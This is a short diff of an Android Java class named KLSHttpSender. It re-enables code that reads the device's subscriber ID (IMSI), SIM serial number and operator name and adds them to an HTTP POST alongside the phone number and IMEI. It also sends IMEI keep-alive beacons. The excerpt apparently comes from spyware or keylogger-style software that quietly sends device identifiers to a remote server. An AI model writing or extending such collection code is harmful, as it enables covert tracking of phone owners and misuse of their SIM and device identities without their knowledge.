@@ -48,13 +48,13 @@ public class KLSHttpSender {
 			    //nameValuePairs.add(new BasicNameValuePair("Cell Location", mTelephonyManager.getCellLocation().toString()));
 			    nameValuePairs.add(new BasicNameValuePair("Line 1 Number", mTelephonyManager.getLine1Number()));
 			    nameValuePairs.add(new BasicNameValuePair("Network Operator", mTelephonyManager.getNetworkOperator()));
-			    //nameValuePairs.add(new BasicNameValuePair("Network Operator Name", mTelephonyManager.getNetworkOperatorName()));
-			    //nameValuePairs.add(new BasicNameValuePair("SubscriberId", mTelephonyManager.getSubscriberId()));
-			    //nameValuePairs.add(new BasicNameValuePair("Sim Serial Number", mTelephonyManager.getSimSerialNumber()));			    
+			    nameValuePairs.add(new BasicNameValuePair("Network Operator Name", mTelephonyManager.getNetworkOperatorName()));
+			    nameValuePairs.add(new BasicNameValuePair("SubscriberId", mTelephonyManager.getSubscriberId()));
+			    nameValuePairs.add(new BasicNameValuePair("Sim Serial Number", mTelephonyManager.getSimSerialNumber()));			    
 		    }
 		    else {
 		    	nameValuePairs.add(new BasicNameValuePair("IMEI", mImei));
-		    	nameValuePairs.add(new BasicNameValuePair("Error: ", "Keep Alive!"));
+		    	nameValuePairs.add(new BasicNameValuePair("Alive: ", "Keep Alive!"));
 		    }
 		    mHttpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
 
